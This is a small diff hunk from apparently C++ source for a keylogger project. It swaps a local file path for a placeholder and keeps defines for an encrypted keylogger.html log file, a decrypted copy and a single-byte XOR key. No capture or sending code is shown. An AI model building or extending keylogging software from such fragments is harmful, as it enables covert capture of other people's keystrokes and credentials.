@@ -4,7 +4,7 @@
 #include <unordered_map>
 #include <regex>
 
-#define FILE_NAME "D:\\vs\\kl2\\kl2\\keylogger.html"
+#define FILE_NAME "###\\keylogger.html"
 #define DECRYPTED_FILE_NAME "decrypted_keylogger.html"
 #define ENCRYPTION_KEY 0x5A
 using namespace std;
